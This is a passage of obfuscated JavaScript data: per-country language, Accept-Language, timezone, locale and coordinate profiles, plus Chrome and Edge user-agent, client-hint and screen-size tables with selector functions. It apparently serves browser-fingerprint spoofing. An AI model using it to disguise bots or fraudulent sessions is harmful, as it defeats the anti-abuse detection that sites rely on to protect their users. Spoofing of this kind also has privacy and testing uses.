    locale: 'fr_MC',
    lat: 43.7384,
    lon: 7.4246
  },
  MD: {
    name: 'Moldova',
    flag: '\uD83C\uDDF2\uD83C\uDDE9',
    languages: ['ro-MD', 'ro', 'ru-MD'],
    acceptLang: 'ro-MD,ro;q=0.9,ru-MD;q=0.8',
    timezone: 'Europe/Chisinau',
    locale: 'ro_MD',
    lat: 47.0105,
    lon: 28.8638
  },
  ME: {
    name: 'Montenegro',
    flag: '\uD83C\uDDF2\uD83C\uDDEA',
    languages: ['sr-ME', 'sr'],
    acceptLang: 'sr-ME,sr;q=0.9',
    timezone: 'Europe/Podgorica',
    locale: 'sr_ME',
    lat: 42.4304,
    lon: 19.2594
  },
  MF: {
    name: 'Saint Martin',
    flag: '\uD83C\uDDF2\uD83C\uDDEB',
    languages: ['fr-MF', 'fr'],
    acceptLang: 'fr-MF,fr;q=0.9',
    timezone: 'America/Marigot',
    locale: 'fr_MF',
    lat: 18.0708,
    lon: -63.0501
  },
  MG: {
    name: 'Madagascar',
    flag: '\uD83C\uDDF2\uD83C\uDDEC',
    languages: ['mg-MG', 'mg', 'fr-MG'],
    acceptLang: 'mg-MG,mg;q=0.9,fr-MG;q=0.8',
    timezone: 'Indian/Antananarivo',
    locale: 'mg_MG',
    lat: -18.8792,
    lon: 47.5079
  },
  MH: {
    name: 'Marshall Islands',
    flag: '\uD83C\uDDF2\uD83C\uDDED',
    languages: ['en-MH', 'en', 'mh-MH'],
    acceptLang: 'en-MH,en;q=0.9,mh-MH;q=0.8',
    timezone: 'Pacific/Majuro',
    locale: 'en_MH',
    lat: 7.1164,
    lon: 171.1858
  },
  MK: {
    name: 'North Macedonia',
    flag: '\uD83C\uDDF2\uD83C\uDDF0',
    languages: ['mk-MK', 'mk', 'sq-MK'],
    acceptLang: 'mk-MK,mk;q=0.9,sq-MK;q=0.8',
    timezone: 'Europe/Skopje',
    locale: 'mk_MK',
    lat: 41.9973,
    lon: 21.428
  },
  ML: {
    name: 'Mali',
    flag: '\uD83C\uDDF2\uD83C\uDDF1',
    languages: ['fr-ML', 'fr'],
    acceptLang: 'fr-ML,fr;q=0.9',
    timezone: 'Africa/Bamako',
    locale: 'fr_ML',
    lat: 12.6392,
    lon: -8.0029
  },
  MP: {
    name: 'Northern Mariana',
    flag: '\uD83C\uDDF2\uD83C\uDDF5',
    languages: ['en-MP', 'en', 'ch-MP'],
    acceptLang: 'en-MP,en;q=0.9,ch-MP;q=0.8',
    timezone: 'Pacific/Saipan',
    locale: 'en_MP',
    lat: 15.185,
    lon: 145.7467
  },
  MQ: {
    name: 'Martinique',
    flag: '\uD83C\uDDF2\uD83C\uDDF6',
    languages: ['fr-MQ', 'fr'],
    acceptLang: 'fr-MQ,fr;q=0.9',
    timezone: 'America/Martinique',
    locale: 'fr_MQ',
    lat: 14.6415,
    lon: -61.0242
  },
  MR: {
    name: 'Mauritania',
    flag: '\uD83C\uDDF2\uD83C\uDDF7',
    languages: ['ar-MR', 'ar', 'fr-MR'],
    acceptLang: 'ar-MR,ar;q=0.9,fr-MR;q=0.8',
    timezone: 'Africa/Nouakchott',
    locale: 'ar_MR',
    lat: 18.0735,
    lon: -15.9582
  },
  MS: {
    name: 'Montserrat',
    flag: '\uD83C\uDDF2\uD83C\uDDF8',
    languages: ['en-MS', 'en'],
    acceptLang: 'en-MS,en;q=0.9',
    timezone: 'America/Montserrat',
    locale: 'en_MS',
    lat: 16.7425,
    lon: -62.1874
  },
  MU: {
    name: 'Mauritius',
    flag: '\uD83C\uDDF2\uD83C\uDDFA',
    languages: ['en-MU', 'en', 'fr-MU'],
    acceptLang: 'en-MU,en;q=0.9,fr-MU;q=0.8',
    timezone: 'Indian/Mauritius',
    locale: 'en_MU',
    lat: -20.1609,
    lon: 57.5012
  },
  MV: {
    name: 'Maldives',
    flag: '\uD83C\uDDF2\uD83C\uDDFB',
    languages: ['dv-MV', 'dv'],
    acceptLang: 'dv-MV,dv;q=0.9',
    timezone: 'Indian/Maldives',
    locale: 'dv_MV',
    lat: 4.1755,
    lon: 73.5093
  },
  MW: {
    name: 'Malawi',
    flag: '\uD83C\uDDF2\uD83C\uDDFC',
    languages: ['en-MW', 'en', 'ny-MW'],
    acceptLang: 'en-MW,en;q=0.9,ny-MW;q=0.8',
    timezone: 'Africa/Blantyre',
    locale: 'en_MW',
    lat: -13.9626,
    lon: 33.7741
  },
  MZ: {
    name: 'Mozambique',
    flag: '\uD83C\uDDF2\uD83C\uDDFF',
    languages: ['pt-MZ', 'pt'],
    acceptLang: 'pt-MZ,pt;q=0.9',
    timezone: 'Africa/Maputo',
    locale: 'pt_MZ',
    lat: -25.9692,
    lon: 32.5732
  },
  NA: {
    name: 'Namibia',
    flag: '\uD83C\uDDF3\uD83C\uDDE6',
    languages: ['en-NA', 'en', 'af-NA'],
    acceptLang: 'en-NA,en;q=0.9,af-NA;q=0.8',
    timezone: 'Africa/Windhoek',
    locale: 'en_NA',
    lat: -22.5609,
    lon: 17.0658
  },
  NC: {
    name: 'New Caledonia',
    flag: '\uD83C\uDDF3\uD83C\uDDE8',
    languages: ['fr-NC', 'fr'],
    acceptLang: 'fr-NC,fr;q=0.9',
    timezone: 'Pacific/Noumea',
    locale: 'fr_NC',
    lat: -22.2758,
    lon: 166.458
  },
  NE: {
    name: 'Niger',
    flag: '\uD83C\uDDF3\uD83C\uDDEA',
    languages: ['fr-NE', 'fr', 'ha-NE'],
    acceptLang: 'fr-NE,fr;q=0.9,ha-NE;q=0.8',
    timezone: 'Africa/Niamey',
    locale: 'fr_NE',
    lat: 13.5127,
    lon: 2.1124
  },
  NF: {
    name: 'Norfolk Island',
    flag: '\uD83C\uDDF3\uD83C\uDDEB',
    languages: ['en-NF', 'en'],
    acceptLang: 'en-NF,en;q=0.9',
    timezone: 'Pacific/Norfolk',
    locale: 'en_NF',
    lat: -29.0408,
    lon: 167.9547
  },
  NI: {
    name: 'Nicaragua',
    flag: '\uD83C\uDDF3\uD83C\uDDEE',
    languages: ['es-NI', 'es'],
    acceptLang: 'es-NI,es;q=0.9',
    timezone: 'America/Managua',
    locale: 'es_NI',
    lat: 12.1149,
    lon: -86.2362
  },
  NR: {
    name: 'Nauru',
    flag: '\uD83C\uDDF3\uD83C\uDDF7',
    languages: ['en-NR', 'en', 'na-NR'],
    acceptLang: 'en-NR,en;q=0.9,na-NR;q=0.8',
    timezone: 'Pacific/Nauru',
    locale: 'en_NR',
    lat: -0.5228,
    lon: 166.9315
  },
  NU: {
    name: 'Niue',
    flag: '\uD83C\uDDF3\uD83C\uDDFA',
    languages: ['en-NU', 'en'],
    acceptLang: 'en-NU,en;q=0.9',
    timezone: 'Pacific/Niue',
    locale: 'en_NU',
    lat: -19.0544,
    lon: -169.8672
  },
  PF: {
    name: 'French Polynesia',
    flag: '\uD83C\uDDF5\uD83C\uDDEB',
    languages: ['fr-PF', 'fr'],
    acceptLang: 'fr-PF,fr;q=0.9',
    timezone: 'Pacific/Tahiti',
    locale: 'fr_PF',
    lat: -17.5516,
    lon: -149.5585
  },
  PM: {
    name: 'Saint Pierre',
    flag: '\uD83C\uDDF5\uD83C\uDDF2',
    languages: ['fr-PM', 'fr'],
    acceptLang: 'fr-PM,fr;q=0.9',
    timezone: 'America/Miquelon',
    locale: 'fr_PM',
    lat: 46.8852,
    lon: -56.3159
  },
  PN: {
    name: 'Pitcairn Islands',
    flag: '\uD83C\uDDF5\uD83C\uDDF3',
    languages: ['en-PN', 'en'],
    acceptLang: 'en-PN,en;q=0.9',
    timezone: 'Pacific/Pitcairn',
    locale: 'en_PN',
    lat: -25.066,
    lon: -130.1015
  },
  PR: {
    name: 'Puerto Rico',
    flag: '\uD83C\uDDF5\uD83C\uDDF7',
    languages: ['es-PR', 'es', 'en-PR'],
    acceptLang: 'es-PR,es;q=0.9,en-PR;q=0.8',
    timezone: 'America/Puerto_Rico',
    locale: 'es_PR',
    lat: 18.4655,
    lon: -66.1057
  },
  PW: {
    name: 'Palau',
    flag: '\uD83C\uDDF5\uD83C\uDDFC',
    languages: ['en-PW', 'en', 'pau-PW'],
    acceptLang: 'en-PW,en;q=0.9,pau-PW;q=0.8',
    timezone: 'Pacific/Palau',
    locale: 'en_PW',
    lat: 7.515,
    lon: 134.5825
  },
  RE: {
    name: 'Réunion',
    flag: '\uD83C\uDDF7\uD83C\uDDEA',
    languages: ['fr-RE', 'fr'],
    acceptLang: 'fr-RE,fr;q=0.9',
    timezone: 'Indian/Reunion',
    locale: 'fr_RE',
    lat: -20.8823,
    lon: 55.4504
  },
  RW: {
    name: 'Rwanda',
    flag: '\uD83C\uDDF7\uD83C\uDDFC',
    languages: ['rw-RW', 'rw', 'fr-RW'],
    acceptLang: 'rw-RW,rw;q=0.9,fr-RW;q=0.8',
    timezone: 'Africa/Kigali',
    locale: 'rw_RW',
    lat: -1.9403,
    lon: 29.8739
  },
  SB: {
    name: 'Solomon Islands',
    flag: '\uD83C\uDDF8\uD83C\uDDE7',
    languages: ['en-SB', 'en'],
    acceptLang: 'en-SB,en;q=0.9',
    timezone: 'Pacific/Guadalcanal',
    locale: 'en_SB',
    lat: -9.4438,
    lon: 159.9498
  },
  SC: {
    name: 'Seychelles',
    flag: '\uD83C\uDDF8\uD83C\uDDE8',
    languages: ['fr-SC', 'fr', 'en-SC'],
    acceptLang: 'fr-SC,fr;q=0.9,en-SC;q=0.8',
    timezone: 'Indian/Mahe',
    locale: 'fr_SC',
    lat: -4.6191,
    lon: 55.4513
  },
  SD: {
    name: 'Sudan',
    flag: '\uD83C\uDDF8\uD83C\uDDE9',
    languages: ['ar-SD', 'ar'],
    acceptLang: 'ar-SD,ar;q=0.9',
    timezone: 'Africa/Khartoum',
    locale: 'ar_SD',
    lat: 15.5007,
    lon: 32.5599
  },
  SH: {
    name: 'Saint Helena',
    flag: '\uD83C\uDDF8\uD83C\uDDED',
    languages: ['en-SH', 'en'],
    acceptLang: 'en-SH,en;q=0.9',
    timezone: 'Atlantic/St_Helena',
    locale: 'en_SH',
    lat: -15.965,
    lon: -5.7089
  },
  SJ: {
    name: 'Svalbard',
    flag: '\uD83C\uDDF8\uD83C\uDDEF',
    languages: ['no-SJ', 'no'],
    acceptLang: 'no-SJ,no;q=0.9',
    timezone: 'Arctic/Longyearbyen',
    locale: 'no_SJ',
    lat: 78.2232,
    lon: 15.6267
  },
  SL: {
    name: 'Sierra Leone',
    flag: '\uD83C\uDDF8\uD83C\uDDF1',
    languages: ['en-SL', 'en'],
    acceptLang: 'en-SL,en;q=0.9',
    timezone: 'Africa/Freetown',
    locale: 'en_SL',
    lat: 8.4657,
    lon: -13.2317
  },
  SM: {
    name: 'San Marino',
    flag: '\uD83C\uDDF8\uD83C\uDDF2',
    languages: ['it-SM', 'it'],
    acceptLang: 'it-SM,it;q=0.9',
    timezone: 'Europe/San_Marino',
    locale: 'it_SM',
    lat: 43.9424,
    lon: 12.4578
  },
  SO: {
    name: 'Somalia',
    flag: '\uD83C\uDDF8\uD83C\uDDF4',
    languages: ['so-SO', 'so', 'ar-SO'],
    acceptLang: 'so-SO,so;q=0.9,ar-SO;q=0.8',
    timezone: 'Africa/Mogadishu',
    locale: 'so_SO',
    lat: 2.0469,
    lon: 45.3182
  },
  SR: {
    name: 'Suriname',
    flag: '\uD83C\uDDF8\uD83C\uDDF7',
    languages: ['nl-SR', 'nl'],
    acceptLang: 'nl-SR,nl;q=0.9',
    timezone: 'America/Paramaribo',
    locale: 'nl_SR',
    lat: 5.852,
    lon: -55.2038
  },
  SS: {
    name: 'South Sudan',
    flag: '\uD83C\uDDF8\uD83C\uDDF8',
    languages: ['en-SS', 'en', 'ar-SS'],
    acceptLang: 'en-SS,en;q=0.9,ar-SS;q=0.8',
    timezone: 'Africa/Juba',
    locale: 'en_SS',
    lat: 4.8594,
    lon: 31.5713
  },
  ST: {
    name: 'São Tomé',
    flag: '\uD83C\uDDF8\uD83C\uDDF9',
    languages: ['pt-ST', 'pt'],
    acceptLang: 'pt-ST,pt;q=0.9',
    timezone: 'Africa/Sao_Tome',
    locale: 'pt_ST',
    lat: 0.1864,
    lon: 6.6131
  },
  SV: {
    name: 'El Salvador',
    flag: '\uD83C\uDDF8\uD83C\uDDFB',
    languages: ['es-SV', 'es'],
    acceptLang: 'es-SV,es;q=0.9',
    timezone: 'America/El_Salvador',
    locale: 'es_SV',
    lat: 13.6929,
    lon: -89.2182
  },
  SX: {
    name: 'Sint Maarten',
    flag: '\uD83C\uDDF8\uD83C\uDDFD',
    languages: ['nl-SX', 'nl', 'en-SX'],
    acceptLang: 'nl-SX,nl;q=0.9,en-SX;q=0.8',
    timezone: 'America/Lower_Princes',
    locale: 'nl_SX',
    lat: 18.0425,
    lon: -63.0548
  },
  SZ: {
    name: 'Eswatini',
    flag: '\uD83C\uDDF8\uD83C\uDDFF',
    languages: ['en-SZ', 'en', 'ss-SZ'],
    acceptLang: 'en-SZ,en;q=0.9,ss-SZ;q=0.8',
    timezone: 'Africa/Mbabane',
    locale: 'en_SZ',
    lat: -26.3054,
    lon: 31.1367
  },
  TC: {
    name: 'Turks & Caicos',
    flag: '\uD83C\uDDF9\uD83C\uDDE8',
    languages: ['en-TC', 'en'],
    acceptLang: 'en-TC,en;q=0.9',
    timezone: 'America/Grand_Turk',
    locale: 'en_TC',
    lat: 21.4675,
    lon: -71.1389
  },
  TD: {
    name: 'Chad',
    flag: '\uD83C\uDDF9\uD83C\uDDE9',
    languages: ['fr-TD', 'fr', 'ar-TD'],
    acceptLang: 'fr-TD,fr;q=0.9,ar-TD;q=0.8',
    timezone: 'Africa/Ndjamena',
    locale: 'fr_TD',
    lat: 12.1348,
    lon: 15.0557
  },
  TF: {
    name: 'French Southern Lands',
    flag: '\uD83C\uDDF9\uD83C\uDDEB',
    languages: ['fr-TF', 'fr'],
    acceptLang: 'fr-TF,fr;q=0.9',
    timezone: 'Indian/Kerguelen',
    locale: 'fr_TF',
    lat: -49.2804,
    lon: 69.3486
  },
  TG: {
    name: 'Togo',
    flag: '\uD83C\uDDF9\uD83C\uDDEC',
    languages: ['fr-TG', 'fr'],
    acceptLang: 'fr-TG,fr;q=0.9',
    timezone: 'Africa/Lome',
    locale: 'fr_TG',
    lat: 6.1256,
    lon: 1.2254
  },
  TJ: {
    name: 'Tajikistan',
    flag: '\uD83C\uDDF9\uD83C\uDDEF',
    languages: ['tg-TJ', 'tg', 'ru-TJ'],
    acceptLang: 'tg-TJ,tg;q=0.9,ru-TJ;q=0.8',
    timezone: 'Asia/Dushanbe',
    locale: 'tg_TJ',
    lat: 38.5598,
    lon: 68.774
  },
  TK: {
    name: 'Tokelau',
    flag: '\uD83C\uDDF9\uD83C\uDDF0',
    languages: ['en-TK', 'en'],
    acceptLang: 'en-TK,en;q=0.9',
    timezone: 'Pacific/Fakaofo',
    locale: 'en_TK',
    lat: -9.2002,
    lon: -171.8484
  },
  TL: {
    name: 'Timor-Leste',
    flag: '\uD83C\uDDF9\uD83C\uDDF1',
    languages: ['pt-TL', 'pt', 'tet-TL'],
    acceptLang: 'pt-TL,pt;q=0.9,tet-TL;q=0.8',
    timezone: 'Asia/Dili',
    locale: 'pt_TL',
    lat: -8.5569,
    lon: 125.5603
  },
  TM: {
    name: 'Turkmenistan',
    flag: '\uD83C\uDDF9\uD83C\uDDF2',
    languages: ['tk-TM', 'tk', 'ru-TM'],
    acceptLang: 'tk-TM,tk;q=0.9,ru-TM;q=0.8',
    timezone: 'Asia/Ashgabat',
    locale: 'tk_TM',
    lat: 37.9601,
    lon: 58.3261
  },
  TO: {
    name: 'Tonga',
    flag: '\uD83C\uDDF9\uD83C\uDDF4',
    languages: ['to-TO', 'to', 'en-TO'],
    acceptLang: 'to-TO,to;q=0.9,en-TO;q=0.8',
    timezone: 'Pacific/Tongatapu',
    locale: 'to_TO',
    lat: -21.1789,
    lon: -175.1982
  },
  TT: {
    name: 'Trinidad & Tobago',
    flag: '\uD83C\uDDF9\uD83C\uDDF9',
    languages: ['en-TT', 'en'],
    acceptLang: 'en-TT,en;q=0.9',
    timezone: 'America/Port_of_Spain',
    locale: 'en_TT',
    lat: 10.6918,
    lon: -61.2225
  },
  TV: {
    name: 'Tuvalu',
    flag: '\uD83C\uDDF9\uD83C\uDDFB',
    languages: ['en-TV', 'en'],
    acceptLang: 'en-TV,en;q=0.9',
    timezone: 'Pacific/Funafuti',
    locale: 'en_TV',
    lat: -8.5243,
    lon: 179.1942
  },
  UM: {
    name: 'US Minor Outlying',
    flag: '\uD83C\uDDFA\uD83C\uDDF2',
    languages: ['en-UM', 'en'],
    acceptLang: 'en-UM,en;q=0.9',
    timezone: 'Pacific/Wake',
    locale: 'en_UM',
    lat: 19.2823,
    lon: 166.647
  },
  VA: {
    name: 'Vatican City',
    flag: '\uD83C\uDDFB\uD83C\uDDE6',
    languages: ['it-VA', 'it', 'la-VA'],
    acceptLang: 'it-VA,it;q=0.9,la-VA;q=0.8',
    timezone: 'Europe/Vatican',
    locale: 'it_VA',
    lat: 41.9029,
    lon: 12.4534
  },
  VC: {
    name: 'Saint Vincent',
    flag: '\uD83C\uDDFB\uD83C\uDDE8',
    languages: ['en-VC', 'en'],
    acceptLang: 'en-VC,en;q=0.9',
    timezone: 'America/St_Vincent',
    locale: 'en_VC',
    lat: 13.16,
    lon: -61.2248
  },
  VG: {
    name: 'British Virgin Is.',
    flag: '\uD83C\uDDFB\uD83C\uDDEC',
    languages: ['en-VG', 'en'],
    acceptLang: 'en-VG,en;q=0.9',
    timezone: 'America/Tortola',
    locale: 'en_VG',
    lat: 18.4207,
    lon: -64.64
  },
  VI: {
    name: 'US Virgin Islands',
    flag: '\uD83C\uDDFB\uD83C\uDDEE',
    languages: ['en-VI', 'en'],
    acceptLang: 'en-VI,en;q=0.9',
    timezone: 'America/St_Thomas',
    locale: 'en_VI',
    lat: 18.3358,
    lon: -64.8963
  },
  VU: {
    name: 'Vanuatu',
    flag: '\uD83C\uDDFB\uD83C\uDDFA',
    languages: ['bi-VU', 'bi', 'en-VU', 'fr-VU'],
    acceptLang: 'bi-VU,bi;q=0.9,en-VU;q=0.8,fr-VU;q=0.7',
    timezone: 'Pacific/Efate',
    locale: 'bi_VU',
    lat: -17.7334,
    lon: 168.3273
  },
  WF: {
    name: 'Wallis & Futuna',
    flag: '\uD83C\uDDFC\uD83C\uDDEB',
    languages: ['fr-WF', 'fr'],
    acceptLang: 'fr-WF,fr;q=0.9',
    timezone: 'Pacific/Wallis',
    locale: 'fr_WF',
    lat: -13.2825,
    lon: -176.1764
  },
  WS: {
    name: 'Samoa',
    flag: '\uD83C\uDDFC\uD83C\uDDF8',
    languages: ['sm-WS', 'sm', 'en-WS'],
    acceptLang: 'sm-WS,sm;q=0.9,en-WS;q=0.8',
    timezone: 'Pacific/Apia',
    locale: 'sm_WS',
    lat: -13.8506,
    lon: -171.7513
  },
  XK: {
    name: 'Kosovo',
    flag: '\uD83C\uDDFD\uD83C\uDDF0',
    languages: ['sq-XK', 'sq', 'sr-XK'],
    acceptLang: 'sq-XK,sq;q=0.9,sr-XK;q=0.8',
    timezone: 'Europe/Belgrade',
    locale: 'sq_XK',
    lat: 42.6629,
    lon: 21.1655
  },
  YT: {
    name: 'Mayotte',
    flag: '\uD83C\uDDFE\uD83C\uDDF9',
    languages: ['fr-YT', 'fr'],
    acceptLang: 'fr-YT,fr;q=0.9',
    timezone: 'Indian/Mayotte',
    locale: 'fr_YT',
    lat: -12.8275,
    lon: 45.1662
  },
  ZM: {
    name: 'Zambia',
    flag: '\uD83C\uDDFF\uD83C\uDDF2',
    languages: ['en-ZM', 'en', 'bem-ZM'],
    acceptLang: 'en-ZM,en;q=0.9,bem-ZM;q=0.8',
    timezone: 'Africa/Lusaka',
    locale: 'en_ZM',
    lat: -15.3875,
    lon: 28.3228
  },
  ZW: {
    name: 'Zimbabwe',
    flag: '\uD83C\uDDFF\uD83C\uDDFC',
    languages: ['en-ZW', 'en', 'sn-ZW'],
    acceptLang: 'en-ZW,en;q=0.9,sn-ZW;q=0.8',
    timezone: 'Africa/Harare',
    locale: 'en_ZW',
    lat: -17.8252,
    lon: 31.0335
  },
  AC: {
    name: 'Ascension Island',
    flag: '\uD83C\uDDE6\uD83C\uDDE8',
    languages: ['en-AC', 'en'],
    acceptLang: 'en-AC,en;q=0.9',
    timezone: 'Atlantic/Ascension',
    locale: 'en_AC',
    lat: -7.9467,
    lon: -14.3559
  },
  DG: {
    name: 'Diego Garcia',
    flag: '\uD83C\uDDE9\uD83C\uDDEC',
    languages: ['en-DG', 'en'],
    acceptLang: 'en-DG,en;q=0.9',
    timezone: 'Indian/Chagos',
    locale: 'en_DG',
    lat: -7.3195,
    lon: 72.4229
  },
  IC: {
    name: 'Canary Islands',
    flag: '\uD83C\uDDEE\uD83C\uDDE8',
    languages: ['es-IC', 'es'],
    acceptLang: 'es-IC,es;q=0.9',
    timezone: 'Atlantic/Canary',
    locale: 'es_IC',
    lat: 28.2916,
    lon: -16.6291
  },
  EA: {
    name: 'Ceuta & Melilla',
    flag: '\uD83C\uDDEA\uD83C\uDDE6',
    languages: ['es-EA', 'es'],
    acceptLang: 'es-EA,es;q=0.9',
    timezone: 'Africa/Ceuta',
    locale: 'es_EA',
    lat: 35.8894,
    lon: -5.3213
  }
};
const varDuringOrange = [{
  ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
  platform: 'Win32',
  platformStr: 'Windows',
  platformVersion: '15.0.0',
  brands: [{
    brand: 'Chromium',
    version: '134'
  }, {
    brand: 'Google Chrome',
    version: '134'
  }, {
    brand: 'Not-A.Brand',
    version: '99'
  }],
  fullVer: '134.0.6998.88',
  arch: 'x86',
  bitness: '64',
  mobile: false,
  model: ''
}, {
  ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
  platform: 'Win32',
  platformStr: 'Windows',
  platformVersion: '15.0.0',
  brands: [{
    brand: 'Chromium',
    version: '133'
  }, {
    brand: 'Google Chrome',
    version: '133'
  }, {
    brand: 'Not-A.Brand',
    version: '99'
  }],
  fullVer: '133.0.6943.98',
  arch: 'x86',
  bitness: '64',
  mobile: false,
  model: ''
}, {
  ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0',
  platform: 'Win32',
  platformStr: 'Windows',
  platformVersion: '15.0.0',
  brands: [{
    brand: 'Chromium',
    version: '134'
  }, {
    brand: 'Microsoft Edge',
    version: '134'
  }, {
    brand: 'Not-A.Brand',
    version: '99'
  }],
  fullVer: '134.0.3124.51',
  arch: 'x86',
  bitness: '64',
  mobile: false,
  model: ''
}, {
  ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
  platform: 'Win32',
  platformStr: 'Windows',
  platformVersion: '10.0.0',
  brands: [{
    brand: 'Chromium',
    version: '132'
  }, {
    brand: 'Google Chrome',
    version: '132'
  }, {
    brand: 'Not_A Brand',
    version: '8'
  }],
  fullVer: '132.0.6834.110',
  arch: 'x86',
  bitness: '64',
  mobile: false,
  model: ''
}];
const varGentleWithout = [{
  ua: 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
  platform: 'Linux armv81',
  platformStr: 'Android',
  platformVersion: '14.0.0',
  brands: [{
    brand: 'Chromium',
    version: '134'
  }, {
    brand: 'Google Chrome',
    version: '134'
  }, {
    brand: 'Not-A.Brand',
    version: '99'
  }],
  fullVer: '134.0.6998.88',
  arch: 'arm',
  bitness: '64',
  mobile: true,
  model: 'Pixel 8'
}, {
  ua: 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
  platform: 'Linux armv81',
  platformStr: 'Android',
  platformVersion: '14.0.0',
  brands: [{
    brand: 'Chromium',
    version: '134'
  }, {
    brand: 'Google Chrome',
    version: '134'
  }, {
    brand: 'Not-A.Brand',
    version: '99'
  }],
  fullVer: '134.0.6998.88',
  arch: 'arm',
  bitness: '64',
  mobile: true,
  model: 'SM-S928B'
}, {
  ua: 'Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
  platform: 'Linux armv81',
  platformStr: 'Android',
  platformVersion: '13.0.0',
  brands: [{
    brand: 'Chromium',
    version: '133'
  }, {
    brand: 'Google Chrome',
    version: '133'
  }, {
    brand: 'Not-A.Brand',
    version: '99'
  }],
  fullVer: '133.0.6943.98',
  arch: 'arm',
  bitness: '64',
  mobile: true,
  model: 'SM-A536B'
}, {
  ua: 'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
  platform: 'Linux armv81',
  platformStr: 'Android',
  platformVersion: '14.0.0',
  brands: [{
    brand: 'Chromium',
    version: '133'
  }, {
    brand: 'Google Chrome',
    version: '133'
  }, {
    brand: 'Not-A.Brand',
    version: '99'
  }],
  fullVer: '133.0.6943.98',
  arch: 'arm',
  bitness: '64',
  mobile: true,
  model: 'Pixel 7'
}];
const varDiseaseStems = {
  US: ['America/New_York', 'America/Chicago', 'America/Denver', 'America/Los_Angeles', 'America/Phoenix'],
  CA: ['America/Toronto', 'America/Vancouver', 'America/Edmonton', 'America/Winnipeg'],
  AU: ['Australia/Sydney', 'Australia/Melbourne', 'Australia/Brisbane', 'Australia/Perth'],
  BR: ['America/Sao_Paulo', 'America/Manaus', 'America/Fortaleza', 'America/Recife'],
  RU: ['Europe/Moscow', 'Asia/Yekaterinburg', 'Asia/Novosibirsk', 'Asia/Vladivostok'],
  MX: ['America/Mexico_City', 'America/Tijuana', 'America/Monterrey', 'America/Cancun'],
  ID: ['Asia/Jakarta', 'Asia/Makassar', 'Asia/Jayapura']
};
const varAutomobileWet = [{
  w: 1920,
  h: 1080,
  dpr: 1
}, {
  w: 1366,
  h: 768,
  dpr: 1
}, {
  w: 1440,
  h: 900,
  dpr: 1
}, {
  w: 1536,
  h: 864,
  dpr: 1
}, {
  w: 1280,
  h: 800,
  dpr: 1
}, {
  w: 2560,
  h: 1440,
  dpr: 2
}, {
  w: 1600,
  h: 900,
  dpr: 1
}, {
  w: 1280,
  h: 1024,
  dpr: 1
}];
const varAnywherePipe = [{
  w: 412,
  h: 915,
  dpr: 2.625
}, {
  w: 393,
  h: 851,
  dpr: 2.75
}, {
  w: 360,
  h: 780,
  dpr: 3
}, {
  w: 384,
  h: 854,
  dpr: 2.625
}, {
  w: 412,
  h: 892,
  dpr: 2.625
}];
function funcLionPowerful(argFailedPond, argBadWorse) {
  const varExpressSlope = argFailedPond === 'android' ? varGentleWithout : varDuringOrange;
  return varExpressSlope[argBadWorse % varExpressSlope.length];
}
function funcFightingWhich(argBeginningWalk, argFruitPilot) {
  const varConsistTitle = argBeginningWalk === 'android' ? varAnywherePipe : varAutomobileWet;
  return varConsistTitle[argFruitPilot % varConsistTitle.length];
}
function funcAirplaneRose(argGroupPoem, argClearScience, argFillPopular) {
  const varDecideNumeral = varDiseaseStems[argGroupPoem];
  if (varDecideNumeral && varDecideNumeral.length) {
    return varDecideNumeral[argFillPopular % varDecideNumeral.length];
  }
  return argClearScience;
}
const varBlowMouth = new Set(['AC', 'AG', 'AI', 'AU', 'BB', 'BM', 'BS', 'BW', 'BZ', 'CA', 'CC', 'CK', 'CX', 'DG', 'DM', 'FJ', 'FK', 'FM', 'GB', 'GD', 'GG', 'GH', 'GI', 'GM', 'GY', 'HK', 'IE', 'IM', 'IN', 'IO', 'JE', 'JM', 'KE', 'KI', 'KN', 'KY', 'LC', 'LR', 'MH', 'MO', 'MP', 'MS', 'MU', 'MW', 'NA', 'NF', 'NG', 'NR', 'NU', 'NZ', 'PG', 'PH', 'PN', 'PW', 'SB', 'SC', 'SG', 'SH', 'SL', 'SS', 'SZ', 'TC', 'TT', 'TV', 'TZ', 'UG', 'UM', 'US', 'VC', 'VG', 'VI', 'ZA', 'ZM', 'ZW']);
const varHeartScared = {
  IN: ['hi-IN', 'hi', 'en-IN', 'en'],
  PH: ['fil-PH', 'fil', 'en-PH', 'en'],
  BD: ['bn-BD', 'bn'],
  PK: ['ur-PK', 'ur', 'en-PK'],
  LK: ['si-LK', 'si', 'ta-LK', 'ta', 'en-LK'],
  NP: ['ne-NP', 'ne'],
  MM: ['my-MM', 'my'],
  KH: ['km-KH', 'km'],
  LA: ['lo-LA', 'lo'],
  MN: ['mn-MN', 'mn'],
  AF: ['ps-AF', 'ps', 'fa-AF', 'fa'],
  TW: ['zh-TW', 'zh'],
  CN: ['zh-CN', 'zh'],
  JP: ['ja-JP', 'ja'],
  KR: ['ko-KR', 'ko'],
  TH: ['th-TH', 'th'],
  VN: ['vi-VN', 'vi'],
  ID: ['id-ID', 'id'],
  MY: ['ms-MY', 'ms', 'en-MY'],
  DE: ['de-DE', 'de'],
  FR: ['fr-FR', 'fr'],
  ES: ['es-ES', 'es'],
  IT: ['it-IT', 'it'],
  PT: ['pt-PT', 'pt'],
  BR: ['pt-BR', 'pt'],
  MX: ['es-MX', 'es'],
  AR: ['es-AR', 'es'],
  RU: ['ru-RU', 'ru'],
  UA: ['uk-UA', 'uk'],
  TR: ['tr-TR', 'tr'],
  PL: ['pl-PL', 'pl'],
  NL: ['nl-NL', 'nl'],
